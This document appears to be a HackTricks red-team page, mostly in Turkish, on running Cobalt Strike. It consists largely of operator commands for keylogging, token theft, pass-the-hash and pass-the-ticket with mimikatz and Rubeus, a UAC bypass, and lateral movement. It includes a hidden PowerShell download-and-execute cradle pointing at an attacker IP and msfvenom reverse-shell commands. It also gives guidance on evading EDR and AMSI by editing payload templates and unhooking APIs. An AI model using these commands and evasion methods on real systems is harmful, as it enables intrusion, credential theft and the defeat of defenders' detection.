# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` ardından nerede dinleyeceğinizi, hangi tür beacon'ın kullanılacağını (http, dns, smb...) ve daha fazlasını seçebilirsiniz.

### Peer2Peer Listeners

Bu listener'ların beacon'ları C2 ile doğrudan iletişim kurmak zorunda değildir; diğer beacon'lar aracılığıyla iletişim kurabilirler.

`Cobalt Strike -> Listeners -> Add/Edit` ardından TCP veya SMB beacon'larını seçmeniz gerekir

* **TCP beacon, seçilen porta bir listener kurar.** Başka bir beacon'dan bir TCP beacon'a bağlanmak için `connect <ip> <port>` komutunu kullanın
* **SMB beacon seçilen isimde bir pipename'de dinler.** Bir SMB beacon'a bağlanmak için `link [target] [pipe]` komutunu kullanın.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** HTA dosyaları için
* **`MS Office Macro`** makrolu bir Office belgesi için
* **`Windows Executable`** .exe, .dll veya service .exe için
* **`Windows Executable (S)`** stageless bir .exe, .dll veya service .exe için (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Bu, cobalt strike'tan beacon'ı indirmek için bitsadmin, exe, powershell ve python gibi formatlarda bir script/executable oluşturur

#### Host Payloads

Eğer barındırmak istediğiniz dosyaya zaten bir web sunucusunda sahipseniz `Attacks -> Web Drive-by -> Host File`'a gidin ve barındırılacak dosyayı ile web sunucusu yapılandırmasını seçin.

### Beacon Options

<details>
<summary>Beacon seçenekleri ve komutları</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Özel implantlar / Linux Beacons

- Özel bir ajanın Team Server HTTP/S protokolünü (varsayılan malleable C2 profile) konuşması yeterlidir; register/check-in yapıp görev alabilir. Tasking ve output için Cobalt Strike UI'ını yeniden kullanmak adına profilde tanımlı aynı URIs/headers/metadata crypto'yu uygulayın.
- Bir Aggressor Script (ör. `CustomBeacon.cna`) non-Windows beacon için payload üretimini sarmalayabilir; böylece operatörler listener'ı seçip ELF payload'ları doğrudan GUI'den üretebilir.
- Team Server'a açılan örnek Linux task handler'lar: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, ve `exit`. Bunlar Team Server tarafından beklenen task ID'lerine eşlenir ve doğru formatta output döndürecek şekilde server-side uygulanmalıdır.
- Linux'ta BOF desteği, Beacon Object Files'ı süreç içinde yükleyerek TrustedSec'in ELFLoader'ı ile eklenebilir ([https://github.com/trustedsec/ELFLoader]) (Outflank-style BOF'ları da destekler). Bu, implant'ın bağlamında/izinleriyle yeni süreçler spawn etmeden modüler post-exploitation çalıştırmaya izin verir.
- Pivoting açısından Windows Beacons ile eşdeğerlik sağlamak için custom beacon içine bir SOCKS handler gömün: operatör `socks <port>` çalıştırdığında implant, operatör araçlarını ele geçirilmiş Linux host üzerinden iç ağlara yönlendirecek bir local proxy açmalıdır.

## Opsec

### Execute-Assembly

The **`execute-assembly`** uzaktaki bir process injection ile belirtilen programı çalıştırmak için **kurban bir süreç (sacrificial process)** kullanır. Bu, belirli Win APIs'in süreç içine inject etmek için kullanılması nedeniyle çok gürültülüdür ve çoğu EDR tarafından kontrol edilir. Ancak aynı süreç içinde bir şey yüklemek için kullanılabilecek bazı özel araçlar vardır:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike içinde ayrıca BOF (Beacon Object Files) kullanabilirsiniz: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor scripti `https://github.com/outflanknl/HelpColor` Cobalt Strike'da `helpx` komutunu oluşturur; komutlarda BOF'lar için (yeşil), Fork&Run tipi işlemler için (sarı) ve ProcessExecution/injection benzeri işlemler için (kırmızı) renkler koyar. Bu, hangi komutların daha stealthy olduğunu anlamaya yardımcı olur.

### Act as the user

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` gibi event'leri kontrol edebilirsiniz:

- Security EID 4624 - Alışılmış mesai saatlerini bilmek için tüm interactive logon'ları kontrol edin.
- System EID 12,13 - Kapatma/başlatma/uyku sıklığını kontrol edin.
- Security EID 4624/4625 - Gelen geçerli/geçersiz NTLM denemelerini kontrol edin.
- Security EID 4648 - Plaintext credential kullanılarak logon yapıldığında bu event oluşturulur. Eğer bir süreç bunu üretmişse, binary muhtemelen clear text credential'ları bir config dosyasında veya kod içinde tutuyor olabilir.

Cobalt Strike'dan `jump` kullanırken, yeni sürecin daha meşru görünmesi için `wmi_msbuild` yöntemini kullanmak genellikle daha iyidir.

### Use computer accounts

Savunucuların kullanıcı kaynaklı garip davranışları kontrol ederken genellikle service account'ları ve `*$` gibi computer account'ları izlemelerinden çıkardıklarını görürsünüz. Bu hesapları lateral movement veya privilege escalation için kullanabilirsiniz.

### Use stageless payloads

Stageless payload'lar, ikinci bir stage'i C2 sunucusundan indirmeleri gerekmediği için staged olanlara göre daha az gürültülüdür. Bu, ilk bağlantıdan sonra ağ trafiği üretmedikleri anlamına gelir ve network-tabanlı savunmalar tarafından tespit edilme olasılıklarını düşürür.

### Tokens & Token Store

Token çalarken veya oluştururken dikkatli olun; bir EDR tüm thread'lerin token'larını enum ederek süreç içinde farklı bir kullanıcıya veya hatta SYSTEM'a ait bir token bulabilir.

Bu nedenle token'ları **per beacon** saklamak işinize yarar; aynı token'ı tekrar tekrar çalmaya gerek kalmaz. Bu, lateral movement veya çalınmış bir token'ı birden çok kez kullanmanız gerektiğinde faydalıdır:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- `token-store show`
- `token-store use <id>`
- `token-store remove <id>`
- `token-store remove-all`

Lateral hareket ederken genelde yeni bir token üretmektense bir token çalmak veya pass the hash attack yapmak daha iyidir.

### Guardrails

Cobalt Strike'ta **Guardrails** adı verilen ve belirli komutların ya da eylemlerin kullanılmasını engellemeye yardımcı olan bir özellik vardır. Guardrails, `make_token`, `jump`, `remote-exec` gibi lateral movement veya privilege escalation için yaygın olarak kullanılan belirli komutları engelleyecek şekilde yapılandırılabilir.

Ayrıca repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks] bazı kontroller ve payload çalıştırmadan önce göz önünde bulundurabileceğiniz fikirler içerir.

### Ticket şifrelemesi

Bir AD ortamında ticket'ların şifrelemesine dikkat edin. Varsayılan olarak bazı araçlar Kerberos ticket'ları için RC4 kullanabilir; bu, AES'e göre daha zayıftır ve güncel ortamlarda varsayılan olarak AES kullanılır. Zayıf şifreleme algoritmaları için izleme yapan savunucular bunu tespit edebilir.

### Varsayılanlardan kaçının

Cobalt Strike kullanılırken SMB pipe'ları varsayılan olarak `msagent_####` ve `status_####` isimlerine sahip olur. Bu isimleri değiştirin. Var olan pipe isimlerini Cobalt Strike içinde şu komutla kontrol etmek mümkündür: `ls \\.\pipe\`

Ayrıca SSH oturumlarıyla `\\.\pipe\postex_ssh_####` adlı bir pipe oluşturulur. Bunu `set ssh_pipename "<new_name>";` ile değiştirin.

Postex exploitation saldırılarında `\\.\pipe\postex_####` pipe'ları `set pipename "<new_name>"` ile değiştirilebilir.

Cobalt Strike profillerinde ayrıca şunları değiştirebilirsiniz:
- `rwx` kullanmaktan kaçınmak
- `process-inject {...}` bloğunda process injection davranışının nasıl çalıştığı (hangi API'lerin kullanılacağı)
- `post-ex {…}` bloğunda "fork and run" davranışının nasıl çalıştığı
- sleep zamanı
- belleğe yüklenecek binary'lerin maksimum boyutu
- `stage {...}` bloğunda bellek ayak izi ve DLL içeriği
- network trafiği

### Bypass memory scanning

Bazı EDR'ler bellek içinde bilinen malware imzalarını tarar. Cobalt Strike, `sleep_mask` fonksiyonunu bir BOF olarak değiştirmenize izin verir; böylece backdoor bellekte şifrelenebilir.

### Noisy proc injections

Bir sürece kod inject etmek genellikle çok gürültülüdür; çünkü normal süreçler nadiren bunu yapar ve bunu yapmanın yolları sınırlıdır. Bu yüzden davranış tabanlı tespit sistemleri tarafından fark edilebilir. Ayrıca bazı EDR'ler disk üzerinde olmayan kod içeren thread'leri ağ üzerinden tarayarak tespit edebilir (tarayıcılar gibi JIT kullanan süreçler yaygındır). Örnek: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Yeni bir süreç spawn ederken süreçler arasında normal bir parent-child ilişkisini korumak önemlidir; aksi takdirde tespit edilme riski artar. Örneğin svchost.exe'in iexplorer.exe'yi çalıştırıyor gibi görünmesi şüpheli olur, çünkü normal bir Windows ortamında svchost.exe tipik olarak iexplorer.exe'nin parent'ı değildir.

Cobalt Strike'da yeni bir beacon spawn edildiğinde varsayılan olarak yeni listener'ı çalıştırmak için `rundll32.exe` kullanılır. Bu çok stealthy değildir ve EDR'ler tarafından kolayca tespit edilebilir. Ayrıca `rundll32.exe` args olmadan çalıştırıldığında daha da şüpheli görünür.

Aşağıdaki Cobalt Strike komutuyla yeni beacon'ı spawn etmek için farklı bir process belirleyerek tespit edilmeyi azaltabilirsiniz:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

Saldırganlar bazen araçları yerel olarak çalıştırabilmeli, hatta Linux makinelerinde bile, ve kurbanların trafiğinin bu araca ulaşmasını sağlamalıdırlar (örn. NTLM relay).

Dahası, bazen pass-the.hash veya pass-the-ticket saldırısı yapmak için saldırganın kendi LSASS sürecine bu hash veya ticket'ı yerel olarak eklemesi ve ondan pivot yapması, kurbanın LSASS sürecini değiştirmekten daha gizli olabilir.

Ancak, oluşturulan trafik konusunda **dikkatli olmalısınız**, çünkü backdoor sürecinizden alışılmadık trafik (kerberos?) gönderebilirsiniz. Bunun için bir browser process'ine pivot yapabilirsiniz (ancak bir sürece inject yaparken yakalanabilirsiniz; bu yüzden bunun için gizli bir yöntem düşünün).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Cobalt Strike'ın yüklü olanlar yerine bizim istediğimiz diskten kaynakları kullanmasını sağlamak için agresif script `dist-pipe\artifact.cna`'yı yüklemeyi unutmayın.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Şablonlarla birlikte [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanarak, defender'ın (bu durumda AMSI) neleri beğenmediğini bulup değiştirebilirsiniz:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Tespit edilen satırları değiştirerek yakalanmayacak bir şablon oluşturabilirsiniz.

Agresif `ResourceKit\resources.cna` scriptini yüklemeyi unutmayın; bu, Cobalt Strike'a diskten istediğimiz kaynakları kullanmasını ve halihazırda yüklü olanları değil, tercih etmesini söyler.

#### Function hooks | Syscall

Function hooking, kötü amaçlı etkinliği tespit etmek için ERDs tarafından sık kullanılan bir yöntemdir. Cobalt Strike, bu hooks'ları atlamanıza olanak sağlar: standart Windows API çağrıları yerine **syscalls** kullanarak ve **`None`** config'i seçerek; veya bir fonksiyonun `Nt*` versiyonunu **`Direct`** ayarıyla kullanarak; ya da malleable profile içindeki **`Indirect`** seçeneği ile `Nt*` fonksiyonunun üzerinden atlayarak. Sisteme bağlı olarak, bir seçenek diğerinden daha gizli olabilir.

Bu, profile içinde veya **`syscall-method`** komutunu kullanarak ayarlanabilir.

Ancak bu aynı zamanda gürültülü olabilir.

Cobalt Strike'ın function hooks'ları atlamak için sunduğu seçeneklerden biri bu hooks'ları şu araçla kaldırmaktır: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Hangi fonksiyonların hook'landığını şu araçlarla da kontrol edebilirsiniz: [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) veya [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)

<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Kaynaklar

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42'nin Cobalt Strike metadata şifreleme analizi](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC günlüğü: Cobalt Strike trafiği](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
